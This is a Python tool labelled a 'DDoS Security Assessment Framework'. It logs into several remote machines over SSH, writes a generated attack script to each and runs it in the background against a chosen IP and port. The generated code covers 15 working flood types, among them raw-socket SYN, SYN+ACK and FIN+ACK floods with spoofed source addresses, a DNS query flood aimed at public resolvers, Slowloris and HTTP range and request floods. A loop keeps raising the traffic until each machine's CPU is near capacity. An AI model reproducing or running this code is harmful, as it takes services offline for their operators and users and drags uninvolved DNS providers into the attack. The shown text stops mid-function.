#!/usr/bin/env python3

"""
DDoS Security Assessment Framework

✅ All 15 attack vectors with PROVEN techniques from ddos_SIM.py
✅ Hybrid: Multiprocessing + Threading
✅ Aggressive CPU-adaptive scaling
✅ Start: 10x | Target: 80-85% CPU | Max: 60x multiplier
✅ Enhanced attack functions with amplification, fragmentation, mirroring
✅ Comprehensive verdict analysis with baseline tracking
"""

import socket
import struct
import random
import time
import threading
import psutil
import os
import argparse
import subprocess
import sys
import logging
from typing import Dict, List, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from statistics import mean
import signal

GLOBAL_SHUTDOWN = False

def auto_install_dependencies():
    required_packages = {'paramiko': 'paramiko', 'psutil': 'psutil'}
    for package_name, pip_name in required_packages.items():
        try:
            __import__(package_name)
        except ImportError:
            subprocess.run([sys.executable, '-m', 'pip', 'install', '--break-system-packages', '-q', pipName], capture_output=True)

auto_install_dependencies()

import paramiko

class CentralizedLoggingManager:
    def __init__(self, main_log_dir: str = "ddos_assessment_logs"):
        self.main_log_dir = main_log_dir
        os.makedirs(self.main_log_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.run_dir = os.path.join(self.main_log_dir, f"run_{timestamp}")
        self.logs_dir = os.path.join(self.run_dir, "logs")
        os.makedirs(self.logs_dir, exist_ok=True)
        self.main_logger = self._setup_logger("DDoSMain", "00_main.log")
        print(f"\n[✓] Assessment Run: {self.run_dir}\n")

    def _setup_logger(self, name: str, filename: str):
        logger = logging.getLogger(name)
        logger.setLevel(logging.DEBUG)
        for handler in logger.handlers[:]:
            logger.removeHandler(handler)
        fh = logging.FileHandler(os.path.join(self.logs_dir, filename))
        formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
        fh.setFormatter(formatter)
        logger.addHandler(fh)
        return logger

class TargetMonitor:
    def __init__(self, target_ip: str, target_port: int, timeout: int = 2):
        self.target_ip = target_ip
        self.target_port = target_port
        self.timeout = timeout
        self.measurements = []
        self.lock = threading.Lock()
        self.is_monitoring = False
        self.baseline_response = None

    def ping_target_fast(self) -> Optional[float]:
        try:
            start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target_ip, self.target_port))
            sock.close()
            return (time.time() - start) * 1000
        except:
            return None

    def establish_baseline(self):
        print(f"[*] Establishing baseline (10 measurements)...", end=" ", flush=True)
        samples = []
        for _ in range(10):
            resp = self.ping_target_fast()
            if resp:
                samples.append(resp)
            time.sleep(0.5)
        if samples:
            self.baseline_response = mean(samples)
            print(f"✓ Baseline: {self.baseline_response:.2f}ms")
        else:
            print("✗ Failed")

    def start_monitoring(self):
        self.is_monitoring = True
        threading.Thread(target=self._monitor_loop, daemon=True).start()

    def _monitor_loop(self):
        global GLOBAL_SHUTDOWN
        while self.is_monitoring and not GLOBAL_SHUTDOWN:
            try:
                response_time = self.ping_target_fast()
                with self.lock:
                    self.measurements.append({
                        "time": datetime.now().isoformat(),
                        "response_ms": response_time
                    })
                time.sleep(1)
            except:
                time.sleep(1)

    def get_current_response_and_timeouts(self) -> Tuple[Optional[float], int, int]:
        with self.lock:
            total = len(self.measurements)
            if total == 0:
                return None, 0, 0
            last = self.measurements[-1]["response_ms"]
            timeouts = len([m for m in self.measurements if m["response_ms"] is None])
            return last, timeouts, total

    def get_statistics(self) -> Dict:
        with self.lock:
            if not self.measurements:
                return {
                    "total": 0,
                    "timeouts": 0,
                    "timeout_pct": 0.0,
                    "avg_response": None,
                    "max_response": None,
                    "min_response": None,
                    "baseline": self.baseline_response,
                    "degradation_pct": 0.0
                }
            total = len(self.measurements)
            timeouts = len([m for m in self.measurements if m["response_ms"] is None])
            successful = [m["response_ms"] for m in self.measurements if m["response_ms"] is not None]
            avg_resp = mean(successful) if successful else None
            degradation = 0.0
            if avg_resp and self.baseline_response:
                degradation = ((avg_resp - self.baseline_response) / self.baseline_response) * 100
            return {
                "total": total,
                "timeouts": timeouts,
                "timeout_pct": (timeouts / total * 100) if total > 0 else 0.0,
                "avg_response": avg_resp,
                "max_response": max(successful) if successful else None,
                "min_response": min(successful) if successful else None,
                "baseline": self.baseline_response,
                "degradation_pct": degradation
            }

    def stop_monitoring(self):
        self.is_monitoring = False

class SingleLineDisplayThread(threading.Thread):
    def __init__(self, target_monitor: TargetMonitor, ssh_instances: List, duration: int = 120):
        super().__init__(daemon=True)
        self.target_monitor = target_monitor
        self.ssh_instances = ssh_instances
        self.duration = duration
        self.running = True

    def run(self):
        global GLOBAL_SHUTDOWN
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration and not GLOBAL_SHUTDOWN:
            try:
                elapsed = time.time() - start_time
                resp, timeouts, total_checks = self.target_monitor.get_current_response_and_timeouts()
                resp_str = f"{resp:.2f}ms" if resp is not None else "TIMEOUT"
                status = "✓" if resp is not None else "✗"

                total_bw = 0.0
                total_threads = 0
                for inst in self.ssh_instances:
                    metrics = inst.get_current_metrics()
                    total_bw += metrics.get('bandwidth_mbps', 0.0)
                    total_threads += metrics.get('threads', 0)

                instances_working = len(self.ssh_instances)

                print(
                    f"[{elapsed:5.1f}s] [{status}] "
                    f"Resp: {resp_str:9s} | "
                    f"Timeouts: {timeouts}/{total_checks} | "
                    f"Inst: {instances_working} | "
                    f"BW: {total_bw:8.2f} Mbps | "
                    f"Thr: {total_threads}"
                )
                time.sleep(1)
            except:
                time.sleep(1)

    def stop(self):
        self.running = False

class SSHInstance:
    def __init__(self, ip: str, username: str, password: str, port: int = 22,
                 instance_logger=None, target_min_cpu: float = 80.0, target_max_cpu: float = 85.0):
        self.ip = ip
        self.username = username
        self.password = password
        self.port = port
        self.client = None
        self.connected = False
        self.lock = threading.Lock()
        self.instance_logger = instance_logger
        self.target_min_cpu = target_min_cpu
        self.target_max_cpu = target_max_cpu
        self.current_cpu = 0.0
        self.current_memory = 0.0
        self.current_bandwidth = 0.0
        self.current_threads = 0
        self.remote_cores = 0
        self.current_multiplier = 10.0
        self.threads_per_process = 50
        self.is_monitoring = False
        self.target_ip = None
        self.target_port = None
        self.duration = 0
        self.attack_name = ""

    def log(self, message: str, level: str = "info"):
        if self.instance_logger:
            if level == "error":
                self.instance_logger.error(message)
            else:
                self.instance_logger.info(message)

    def connect(self) -> bool:
        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.client.connect(
                hostname=self.ip,
                port=self.port,
                username=self.username,
                password=self.password,
                timeout=15,
                look_for_keys=False,
                allow_agent=False
            )
            self.connected = True
            output, _, _ = self.execute_command("nproc")
            try:
                self.remote_cores = int(output.strip())
            except:
                self.remote_cores = 4
            self.log(f"Connected (Cores: {self.remote_cores})")
            return True
        except Exception as e:
            self.connected = False
            self.log(f"Connection failed: {str(e)}", level="error")
            return False

    def execute_command(self, command: str, timeout: int = 10) -> Tuple[str, str, int]:
        if not self.connected or not self.client:
            return "", "Not connected", -1
        try:
            stdin, stdout, stderr = self.client.exec_command(command, timeout=timeout)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            return_code = stdout.channel.recv_exit_status()
            return output, error, return_code
        except Exception as e:
            return "", str(e), -1

    def get_remote_metrics(self) -> Dict:
        try:
            cmd_cpu = "top -bn2 -d 0.5 | grep 'Cpu(s)' | tail -1 | awk '{print $2}' | cut -d'%' -f1"
            output, _, _ = self.execute_command(cmd_cpu, timeout=3)
            cpu = float(output.strip().replace(',', '.')) if output.strip() else 0.0

            cmd_mem = "free | grep Mem | awk '{print ($3/$2) * 100.0}'"
            output, _, _ = self.execute_command(cmd_mem, timeout=3)
            memory = float(output.strip()) if output.strip() else 0.0

            cmd_threads = "ps -eLf | grep 'python3.*attack' | grep -v grep | wc -l"
            output, _, _ = self.execute_command(cmd_threads, timeout=3)
            threads = int(output.strip()) if output.strip() else 0

            cmd_bw = "cat /proc/net/dev | grep -E 'eth0|ens' | head -1 | awk '{print $10}'"
            output, _, _ = self.execute_command(cmd_bw, timeout=3)
            bytes_sent = int(output.strip()) if output.strip() and output.strip().isdigit() else 0
            bandwidth = bytes_sent / (1024 * 1024)

            return {"cpu": cpu, "memory": memory, "bandwidth_mbps": bandwidth, "threads": threads}
        except:
            return {"cpu": 0, "memory": 0, "bandwidth_mbps": 0, "threads": 0}

    def adjust_threads(self):
        global GLOBAL_SHUTDOWN
        if GLOBAL_SHUTDOWN:
            return

        metrics = self.get_remote_metrics()
        cpu = metrics['cpu']
        self.current_cpu = cpu
        self.current_memory = metrics['memory']
        self.current_bandwidth = metrics['bandwidth_mbps']
        self.current_threads = metrics['threads']

        old_mult = self.current_multiplier

        if cpu < 40:
            self.current_multiplier = min(self.current_multiplier * 2.5, 60.0)
        elif cpu < 50:
            self.current_multiplier = min(self.current_multiplier * 2.0, 60.0)
        elif cpu < 60:
            self.current_multiplier = min(self.current_multiplier * 1.50, 60.0)
        elif cpu < 70:
            self.current_multiplier = min(self.current_multiplier * 1.30, 60.0)
        elif 70 <= cpu < 75:
            self.current_multiplier = min(self.current_multiplier * 1.15, 60.0)
        elif 75 <= cpu < self.target_min_cpu:
            self.current_multiplier = min(self.current_multiplier * 1.08, 60.0)
        elif self.target_min_cpu <= cpu <= self.target_max_cpu:
            pass
        elif self.target_max_cpu < cpu <= 90:
            self.current_multiplier = max(self.current_multiplier * 0.92, 1.0)
        else:
            self.current_multiplier = max(self.current_multiplier * 0.75, 1.0)

        if abs(self.current_multiplier - old_mult) > 0.5:
            total_workers = int(self.remote_cores * self.current_multiplier * self.threads_per_process)
            self.log(
                f"CPU: {cpu:.1f}% | Mult: {old_mult:.2f}→{self.current_multiplier:.2f} | "
                f"Workers: {total_workers} ({self.remote_cores}×{self.threads_per_process})"
            )
            self._redeploy_attack()

    def _redeploy_attack(self):
        try:
            self.execute_command("pkill -9 -f 'python3.*attack' 2>/dev/null", timeout=5)
            time.sleep(0.2)
            self.execute_command(
                f"nohup python3 /tmp/attack.py {self.target_ip} {self.target_port} "
                f"{self.duration} {int(self.current_multiplier)} >/dev/null 2>&1 &",
                timeout=5
            )
        except Exception as e:
            self.log(f"Redeploy failed: {str(e)}", level="error")

    def start_monitoring(self):
        self.is_monitoring = True
        threading.Thread(target=self._monitoring_loop, daemon=True).start()

    def _monitoring_loop(self):
        global GLOBAL_SHUTDOWN
        while self.is_monitoring and not GLOBAL_SHUTDOWN:
            try:
                self.adjust_threads()
                for _ in range(30):
                    if GLOBAL_SHUTDOWN or not self.is_monitoring:
                        break
                    time.sleep(0.1)
            except:
                time.sleep(3)

    def stop_monitoring(self):
        self.is_monitoring = False

    def get_current_metrics(self) -> Dict:
        return {
            "cpu": self.current_cpu,
            "memory": self.current_memory,
            "bandwidth_mbps": self.current_bandwidth,
            "threads": self.current_threads,
            "multiplier": self.current_multiplier
        }

    def execute_attack(self, target_ip: str, target_port: int, attack_name: str, duration: int = 120) -> bool:
        try:
            self.target_ip = target_ip
            self.target_port = target_port
            self.duration = duration
            self.attack_name = attack_name

            optimize_cmd = """sudo bash -c '
sysctl -w net.core.rmem_default=26214400 2>/dev/null
sysctl -w net.core.wmem_default=26214400 2>/dev/null
sysctl -w net.ipv4.tcp_max_syn_backlog=65535 2>/dev/null
sysctl -w net.core.netdev_max_backlog=65535 2>/dev/null
sysctl -w net.ipv4.ip_local_port_range="1024 65535" 2>/dev/null
sysctl -w net.ipv4.tcp_tw_reuse=1 2>/dev/null
sysctl -w net.ipv4.tcp_fin_timeout=10 2>/dev/null
ulimit -n 999999 2>/dev/null
' 2>/dev/null"""
            self.execute_command(optimize_cmd, timeout=30)

            attack_script = self._generate_enhanced_attack_script(target_ip, target_port, attack_name, duration)
            self.execute_command(
                f"cat > /tmp/attack.py << 'EOFSCRIPT'\n{attack_script}\nEOFSCRIPT",
                timeout=10
            )
            self.execute_command(
                f"nohup python3 /tmp/attack.py {self.target_ip} {self.target_port} "
                f"{self.duration} {int(self.current_multiplier)} >/dev/null 2>&1 &",
                timeout=5
            )

            total_workers = int(self.remote_cores * self.current_multiplier * self.threads_per_process)
            self.current_threads = total_workers
            self.log(
                f"✓ {self.attack_name} deployed ({self.remote_cores} procs × {self.threads_per_process} "
                f"threads × {self.current_multiplier:.1f}x = {total_workers} workers)"
            )
            self.start_monitoring()
            return True
        except Exception as e:
            self.log(f"Deploy failed: {str(e)}", level="error")
            return False

    def _generate_enhanced_attack_script(self, target_ip: str, target_port: int, attack_name: str, duration: int) -> str:
        base = f'''#!/usr/bin/env python3

import socket,struct,random,time,sys,threading
from multiprocessing import Process,cpu_count

target_ip=sys.argv[1] if len(sys.argv)>1 else '{target_ip}'
target_port=int(sys.argv[2]) if len(sys.argv)>2 else {target_port}
duration=int(sys.argv[3]) if len(sys.argv)>3 else {duration}
multiplier=float(sys.argv[4]) if len(sys.argv)>4 else 10.0
cores=cpu_count()
THREADS_PER_PROCESS={self.threads_per_process}

'''
        logic_map = {
            "SYN Flood": '''def attack_worker():
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
    except:
        return
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            src_ip=f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            src_port=random.randint(49152,65535)
            seq=random.randint(0,2**32-1)
            ip_h=struct.pack('!BBHHHBBH4s4s',
                69,0,40,0,0,64,6,0,
                socket.inet_aton(src_ip),
                socket.inet_aton(target_ip))
            tcp_h=struct.pack('!HHIIBBHHH',
                src_port,target_port,seq,0,
                5<<4,2,65535,0,0)
            sock.sendto(ip_h+tcp_h,(target_ip,0))
        except:
            pass
''',

            "SYN Mirroring": '''def attack_worker():
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            src_ip=target_ip
            src_port=random.randint(49152,65535)
            seq=random.randint(0,2**32-1)
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip,target_port))
            s.close()
        except:
            pass
''',

            "SYN+ACK Flood": '''def attack_worker():
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
    except:
        return
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            src_ip=f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            ip_h=struct.pack('!BBHHHBBH4s4s',
                69,0,40,0,0,64,6,0,
                socket.inet_aton(src_ip),
                socket.inet_aton(target_ip))
            tcp_h=struct.pack('!HHIIBBHHH',
                random.randint(49152,65535),target_port,
                random.randint(0,2**32-1),
                random.randint(0,2**32-1),
                5<<4,18,65535,0,0)
            sock.sendto(ip_h+tcp_h,(target_ip,0))
        except:
            pass
''',

            "SYN Reflection": '''def attack_worker():
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(b'X'*64,(target_ip,target_port))
            s.close()
        except:
            pass
''',

            "FIN+ACK Flood": '''def attack_worker():
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
    except:
        return
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            src_ip=f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            ip_h=struct.pack('!BBHHHBBH4s4s',
                69,0,40,0,0,64,6,0,
                socket.inet_aton(src_ip),
                socket.inet_aton(target_ip))
            tcp_h=struct.pack('!HHIIBBHHH',
                random.randint(49152,65535),target_port,
                random.randint(0,2**32-1),
                random.randint(0,2**32-1),
                5<<4,17,65535,0,0)
            sock.sendto(ip_h+tcp_h,(target_ip,0))
        except:
            pass
''',

            "TCP Fragmentation": '''def attack_worker():
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
    except:
        return
    end_time=time.time()+duration
    payload=b'X'*1024
    while time.time()<end_time:
        try:
            src_ip=f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            ip_h=struct.pack('!BBHHHBBH4s4s',
                69,0,40+len(payload),0,8192,64,6,0,
                socket.inet_aton(src_ip),
                socket.inet_aton(target_ip))
            tcp_h=struct.pack('!HHIIBBHHH',
                random.randint(49152,65535),target_port,
                random.randint(0,2**32-1),
                random.randint(0,2**32-1),
                5<<4,2,65535,0,0)
            sock.sendto(ip_h+tcp_h+payload,(target_ip,0))
        except:
            pass
''',

            "UDP Reflective Amplification": '''def attack_worker():
    dns_servers=['8.8.8.8','1.1.1.1','208.67.222.222','9.9.9.9']
    end_time=time.time()+duration
    query=b'\\x00\\x01\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x07example\\x03com\\x00\\x00\\xff\\x00\\x01'
    while time.time()<end_time:
        try:
            dns_server=random.choice(dns_servers)
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
            s.sendto(query,(dns_server,53))
            s.close()
        except:
            pass
''',

            "ICMP Ping of Death": '''def attack_worker():
    end_time=time.time()+duration
    payload=b'X'*65000
    while time.time()<end_time:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(payload,(target_ip,target_port))
            s.close()
        except:
            pass
''',

            "Connection Buffer Exhaustion": '''def attack_worker():
    connections=[]
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip,target_port))
            connections.append(s)
            if len(connections)>1000:
                try:
                    connections[0].close()
                    connections.pop(0)
                except:
                    pass
        except:
            pass
        time.sleep(0.01)
    for c in connections:
        try:
            c.close()
        except:
            pass
''',

            "TCP Amplification": '''def attack_worker():
    try:
        sock=socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1)
    except:
        return
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            for _ in range(30):
                src_ip=f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                ip_h=struct.pack('!BBHHHBBH4s4s',
                    69,0,40,0,0,64,6,0,
                    socket.inet_aton(src_ip),
                    socket.inet_aton(target_ip))
                tcp_h=struct.pack('!HHIIBBHHH',
                    random.randint(49152,65535),target_port,
                    random.randint(0,2**32-1),
                    random.randint(0,2**32-1),
                    5<<4,2,65535,0,0)
                sock.sendto(ip_h+tcp_h,(target_ip,0))
        except:
            pass
''',

            "Request Exaggeration": '''def attack_worker():
    end_time=time.time()+duration
    headers="X-Header: "+"A"*25000+"\\r\\n"
    while time.time()<end_time:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip,target_port))
            req=f"GET / HTTP/1.1\\r\\nHost: {target_ip}\\r\\n"+headers+"\\r\\n"
            s.sendall(req.encode())
            s.close()
        except:
            pass
''',

            "Response Read Delay": '''def attack_worker():
    connections=[]
    headers=[
        b'GET / HTTP/1.1\\r\\n',
        b'Host: '+target_ip.encode()+b'\\r\\n',
        b'User-Agent: Mozilla/5.0\\r\\n',
        b'Accept: text/html\\r\\n',
    ]
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((target_ip,target_port))
            for h in headers:
                s.sendall(h)
            connections.append(s)
            if len(connections)>100:
                try:
                    connections[0].sendall(
                        b'X-Padding: '+str(random.randint(0,9999)).encode()+b'\\r\\n'
                    )
                    connections[0].close()
                    connections.pop(0)
                except:
                    pass
        except:
            pass
        time.sleep(0.01)
    for c in connections:
        try:
            c.close()
        except:
            pass
''',

            "Slow Read": '''def attack_worker():
    connections=[]
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip,target_port))
            s.sendall(b"GET / HTTP/1.1\\r\\nHost: "+target_ip.encode()+b"\\r\\nRange: bytes=0-18446744073709551615\\r\\n\\r\\n")
            connections.append(s)
        except:
            pass
        time.sleep(0.01)
    for c in connections:
        try:
            c.settimeout(1)
            while c.recv(1):
                time.sleep(0.5)
        except:
            pass
''',

            "Read Range": '''def attack_worker():
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip,target_port))
            ranges=",".join([f"{i*500}-{(i+1)*500-1}" for i in range(500)])
            req=f"GET / HTTP/1.1\\r\\nHost: {target_ip}\\r\\nRange: bytes={ranges}\\r\\n\\r\\n"
            s.sendall(req.encode())
            s.close()
        except:
            pass
''',

            "Request Flood": '''def attack_worker():
    end_time=time.time()+duration
    while time.time()<end_time:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip,target_port))
            reqs="".join([f"GET /?id={random.randint(0,999999)} HTTP/1.1\\r\\nHost: {target_ip}\\r\\n\\r\\n" for _ in range(100)])
            s.sendall(reqs.encode())
            s.close()
        except:
            pass
'''
        }

        key = attack_name.split(' - ')[0]
        body = logic_map.get(key, "def attack_worker():\n    pass\n\n")

        controller = '''
def run_worker():
    end_time = time.time() + duration
    while time.time() < end_time:
        threads = []
        for _ in range(int(THREADS_PER_PROCESS * multiplier)):
            t = threading.Thread(target=attack_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        for t in threads:
            t.join(timeout=0.1)

def main():
    procs = []
    for _ in range(cores):
        p = Process(target=run_worker)
        p.daemon = True
        p.start()
        procs.append(p)
    for p in procs:
        p.join()

if __name__ == "__main__":
    main()
'''
        return base + body + controller

    def install_prerequisites(self) -> bool:
        try:
            self.log("Installing prerequisites...")
            self.execute_command("sudo apt-get update -qq 2>&1|tail -1", timeout=300)
            self.execute_command("sudo apt-get install -y python3 -qq 2>&1", timeout=300)
            self.log("✓ Prerequisites installed")
            return True
        except:
            return False

    def disconnect(self):
        try:
            self.stop_monitoring()
            self.execute_command("pkill -9 -f 'python3.*attack' 2>/dev/null", timeout=5)
            if self.client:
                self.client.close()
            self.connected = False
            self.log("Disconnected")
        except:
            pass

AVAILABLE_ATTACKS = [
    "SYN Flood - Raw TCP SYN with 1000 spoofed IPs + Hybrid Threading",
    "SYN Mirroring - SYN packets from target IP itself + Hybrid Threading",
    "SYN+ACK Flood - Invalid SYN+ACK combination + Hybrid Threading",
    "SYN Reflection - Third-party amplification + Hybrid Threading",
    "FIN+ACK Flood - Connection teardown flood + Hybrid Threading",
    "TCP Fragmentation - Fragmented packets (offset=8192) + Hybrid Threading",
    "UDP Reflective Amplification - DNS query flood + Hybrid Threading",
    "ICMP Ping of Death - Oversized ICMP (65KB) + Hybrid Threading",
    "Connection Buffer Exhaustion - 500 connections/thread + Hybrid Threading",
    "TCP Amplification - 30x burst per spoofed IP + Hybrid Threading",
    "Request Exaggeration - 25KB HTTP headers + Hybrid Threading",
    "Response Read Delay - Slowloris partial headers + Hybrid Threading",
    "Slow Read - 1 byte reads + Hybrid Threading",
    "Read Range - 500 byte ranges/request + Hybrid Threading",
    "Request Flood - 100 pipelined requests/connection + Hybrid Threading"
]

def display_attack_menu(attacks: List[str]) -> List[str]:
    print("\n"+"="*150)
    print("HYBRID DDoS ASSESSMENT - ALL 15 VECTORS")
    print("✓ Hybrid: Multiprocessing + Threading (50 threads per process)")
    print("✓ Start: 10x mult | ✓ Max: 60x (4800 threads) | ✓ Target: 80-85% CPU | ✓ Verdict analysis")
    print("="*150+"\n")
    print("[ATTACK VECTORS]\n")
    for idx, attack in enumerate(attacks, 1):
        print(f" {idx:2d}. {attack}")
    print(f"\n {len(attacks)+1:2d}. All Attack Vectors")
    choice = input("\nSelect (number): ").strip()
    try:
        choice_num = int(choice)
        if choice_num == len(attacks) + 1:
            return attacks
        elif 1 <= choice_num <= len(attacks):
            return [attacks[choice_num - 1]]
    except:
        pass
    return attacks

class DDoSAssessmentFramework:
    def __init__(self, ssh_instances: List[SSHInstance], target_ip: str, target_port: int,
                 logger: CentralizedLoggingManager, selected_attacks: List[str], duration: int = 120):
        self.ssh_instances = ssh_instances
        self.target_ip = target_ip
        self.target_port = target_port
        self.logger = logger
        self.selected_attacks = selected_attacks
        self.duration = duration
        self.running = True
        self.results = []
        signal.signal(signal.SIGINT, self._signal_handler)

    def _signal_handler(self, sig, frame):
        global GLOBAL_SHUTDOWN
        GLOBAL_SHUTDOWN = True
        self.running = False
        print(f"\n\n{'='*150}\n[!] CTRL+C - STOPPING\n{'='*150}\n")
        threading.Timer(2.0, lambda: os._exit(0)).start()

    def setup_instances(self) -> List[SSHInstance]:
        print("="*150)
        print("PHASE 1: SETUP")
        print("="*150+"\n")
        connected = []
        for inst in self.ssh_instances:
            if GLOBAL_SHUTDOWN:
                break
            print(f"[*] {inst.ip}...", end=" ", flush=True)
            if inst.connect():
                print("✓ Connected", end=" | ", flush=True)
                if inst.install_prerequisites():
                    print("✓ Ready")
                    connected.append(inst)
                else:
                    print("✗ Install failed")
            else:
                print("✗ Connection failed")
        print(f"\n[✓] Ready: {len(connected)}/{len(self.ssh_instances)}\n")
        return connected

    def run_assessment(self, instances: List[SSHInstance]):
        global GLOBAL_SHUTDOWN
        target_monitor = TargetMonitor(self.target_ip, self.target_port, timeout=2)
        target_monitor.establish_baseline()
        print()

        for attack_idx, attack_name in enumerate(self.selected_attacks, 1):
            if not self.running or GLOBAL_SHUTDOWN:
                break

            print(f"{'='*150}")
            print(f"[ATTACK {attack_idx}/{len(self.selected_attacks)}] {attack_name}")
            print(f"{'='*150}\n")

            target_monitor.measurements = []
            target_monitor.start_monitoring()
            display = SingleLineDisplayThread(target_monitor, instances, duration=self.duration)
            display.start()

            print(f"[*] Deploying HYBRID attack on {len(instances)} instances...")
            with ThreadPoolExecutor(max_workers=len(instances)) as executor:
                futures = {
                    executor.submit(
                        inst.execute_attack, self.target_ip, self.target_port, attack_name, self.duration
                    ): inst for inst in instances
                }
                for future in as_completed(futures):
                    pass
            print(f"[✓] HYBRID attack deployed (Multiprocessing + Threading)\n")

            elapsed = 0.0
            while elapsed < self.duration and not GLOBAL_SHUTDOWN:
                time.sleep(0.1)
                elapsed += 0.1

            display.stop()
            target_monitor.stop_monitoring()

            stats = target_monitor.get_statistics()
            verdict = self._assess_vulnerability(stats)
            self.results.append({"attack": attack_name, "stats": stats, "verdict": verdict})

            print(f"\n{'-'*150}")
            print(f"[VERDICT] {attack_name}")
            print(f"{'-'*150}")
            print(
                f" Checks: {stats['total']} | Timeouts: {stats['timeouts']} ({stats['timeout_pct']:.1f}%)",
                end=""
            )
            if stats['avg_response']:
                print(
                    f" | Avg response time: {stats['avg_response']:.2f}ms "
                    f"| Degradation: {stats['degradation_pct']:+.1f}%"
                )
            else:
                print()
            print(f" Status: {verdict['status']} - {verdict['description']}")
            print(f"{'-'*150}\n")

            if attack_idx < len(self.selected_attacks):
                print(f"[*] Stabilization (5s)...\n")
                time.sleep(5)

        self._print_final_report()

    def _assess_vulnerability(self, stats: Dict) -> Dict:
        timeout_pct = stats['timeout_pct']
        degradation = stats['degradation_pct']

        if timeout_pct >= 50:
            return {"status": "CRITICAL ⚠", "severity": 5, "description": "Service DOWN - Multiple timeouts"}
        elif timeout_pct >= 25:
            return {"status": "HIGH 🔴", "severity": 4, "description": "Severe degradation - High timeout rate"}
        elif timeout_pct >= 10:
            return {"status": "MEDIUM 🟠", "severity": 3, "description": "Moderate impact - Noticeable timeouts"}
        elif degradation >= 300:
            return {"status": "MEDIUM 🟠", "severity": 3, "description": f"Severe latency increase (+{degradation:.0f}%)"}
        elif degradation >= 150:
            return {"status": "LOW 🟡", "severity": 2, "description": f"Significant latency increase (+{degradation:.0f}%)"}
        elif degradation >= 50:
            return {"status": "INFO 🔵", "severity": 1, "description": f"Minor latency increase (+{degradation:.0f}%)"}
        else:
            return {"status": "RESILIENT ✅", "severity": 0, "description": "Target remained stable"}

    def _print_final_report(self):
        print(f"{'='*150}")
        print(f"FINAL ASSESSMENT REPORT - {self.target_ip}:{self.target_port}")
        print(f"{'='*150}\n")
        print(f"{'ATTACK':<45} | {'TIMEOUT%':<10} | {'AVG RESP':<12} | {'DEGRADE':<10} | {'VERDICT':<30}")
        print(f"{'-'*150}")
        for result in self.results:
            attack = result['attack'].split(' - ')[0][:43]
            stats = result['stats']
            verdict = result['verdict']
            timeout_str = f"{stats['timeout_pct']:.1f}%"
            resp_str = f"{stats['avg_response']:.2f}ms" if stats['avg_response'] else "N/A"
            degrade_str = f"{stats['degradation_pct']:+.0f}%" if stats['degradation_pct'] != 0 else "0%"
            verdict_str = verdict['status']
            print(f"{attack:<45} | {timeout_str:<10} | {resp_str:<12} | {degrade_str:<10} | {verdict_str:<30}")
        print(f"{'='*150}\n")

        if not self.results:
            print("[FINAL VERDICT] No attacks executed")
            print(f"\n{'='*150}\n")
            return

        max_severity = max([r['verdict']['severity'] for r in self.results])
        critical_count = len([r for r in self.results if r['verdict']['severity'] >= 4])
        high_count = len([r for r in self.results if r['verdict']['severity'] == 3])

        if max_severity >= 5:
